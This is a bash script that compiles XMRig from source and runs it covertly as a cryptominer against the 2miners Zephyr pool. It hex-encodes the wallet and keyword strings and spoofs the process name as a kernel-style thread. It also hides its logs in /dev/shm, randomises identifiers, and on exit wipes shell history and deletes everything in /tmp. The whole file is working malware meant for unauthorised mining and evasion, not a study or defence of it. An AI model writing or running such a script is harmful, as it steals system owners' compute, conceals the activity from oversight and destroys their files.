#!/bin/bash
export TERM=linux
set -e

_HX() {
    local hex="$1"; local bytes=""
    for ((i=0; i<${#hex}; i+=2)); do bytes+="\\x${hex:$i:2}"; done
    printf "$bytes"
}

_RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
_RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
_RAND_CPU() { echo $((50 + RANDOM % 41)); }

_WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")

_POOLS=(
    "stratum+tcp://zeph.2miners.com:2222"
    "stratum+ssl://zeph.2miners.com:2443"
)
_POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}

_CPULIM=$(_RAND_CPU)
_PRINT_TIME=$((30 + RANDOM % 91))

_WBASE=$(od -An -tx2 -N2 /dev/urandom | tr -d ' ')
_SUFFIX=$(od -An -tx2 -N6 /dev/urandom | tr -d ' ' | head -c 6)
_WORKER="${_WBASE}-${_SUFFIX}"

_BIN_NAME="$(_RAND_STR)"
_FAKE_BIN="/tmp/${_BIN_NAME}"
_PROC_NAME="$(_RAND_STR)"
_SPOOF="[${_PROC_NAME}]"

_RAND_DIR=".cache-$(_RAND_STR)"
_LOG_DIR="/dev/shm/${_RAND_DIR}"
mkdir -p "$_LOG_DIR"
_LOG="${_LOG_DIR}/.log-$(_RAND_STR).tmp"
_PID="/tmp/.pid-$(_RAND_STR).lock"
_CFG="/tmp/config-$(_RAND_STR).json"

_scrub() {
    history -c 2>/dev/null; cat /dev/null > ~/.bash_history 2>/dev/null
    unset HISTFILE; rm -rf /tmp/* 2>/dev/null || true
}
trap '_scrub ; exit' EXIT

# ---- Compile from source (more reliable) ----
_compile_xmrig() {
    [ -d "./xmrig" ] && rm -rf "./xmrig"
    if [ -f "./xmrig" ] && [ -x "./xmrig" ]; then
        echo "✅ Found existing xmrig binary." >&2
        return 0
    fi

    echo "📦 Compiling XMRig from source (may take 3-5 minutes)..." >&2
    # Try to install deps (passwordless sudo may be needed, but we try)
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq 2>/dev/null || true
        sudo apt-get install -y -qq build-essential cmake libuv1-dev libssl-dev libhwloc-dev 2>/dev/null || true
    fi

    git clone --quiet https://github.com/xmrig/xmrig.git /tmp/xmrig-src
    cd /tmp/xmrig-src
    mkdir -p build && cd build
    cmake .. -DCMAKE_BUILD_TYPE=Release >/dev/null
    make -j$(nproc) >/dev/null
    cp xmrig "$OLDPWD"/../xmrig
    cd "$OLDPWD"/..
    chmod +x ./xmrig
    rm -rf /tmp/xmrig-src
    echo "✅ Compiled XMRig successfully." >&2
    return 0
}

_compile_xmrig || {
    echo "❌ Compilation failed. Check dependencies."
    exit 1
}

_BIN="./xmrig"
cp "$_BIN" "$_FAKE_BIN" && chmod +x "$_FAKE_BIN"

# ---- Config ----
printf '{
    "cpu": { "enabled": true, "max-threads-hint": %s, "huge-pages": false, "yield": true, "priority": 0 },
    "pools": [ { "url": "%s", "user": "%s.%s", "pass": "x", "keepalive": true, "tls": false } ],
    "print-time": %s,
    "verbose": true
}\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"

# ---- Launch with verbose logging ----
_BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
_ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))

(
    exec -a "$_SPOOF" "$_FAKE_BIN" --config="$_CFG" --no-color >> "$_LOG" 2>&1 &
    _MPID=$!; echo $_MPID > "$_PID"

    tail -f "$_LOG" | while read line; do
        for kw in "${_ARR[@]}"; do
            if [[ "$line" =~ $kw ]]; then
                kill $_MPID 2>/dev/null; exit 1
            fi
        done
    done &
    wait $_MPID 2>/dev/null
    exit 0
) &

printf "\n\n============================================================\n"
printf "✅ MINER STARTED (compiled from source)\n"
printf "   - Worker: %s\n" "$_WORKER"
printf "   - Process spoof: %s\n" "$_SPOOF"
printf "   - Binary: %s\n" "$_FAKE_BIN"
printf "   - Log: %s\n" "$_LOG"
printf "   - CPU limit: %s%%\n" "$_CPULIM"
printf "============================================================\n"
printf "Watch logs: tail -f %s\n" "$_LOG"
printf "Stop: pkill -f %s\n" "$_BIN_NAME"
printf "============================================================\n\n"

while true; do sleep 3600; done &
wait $(cat "$_PID" 2>/dev/null) 2>/dev/null
sleep infinity
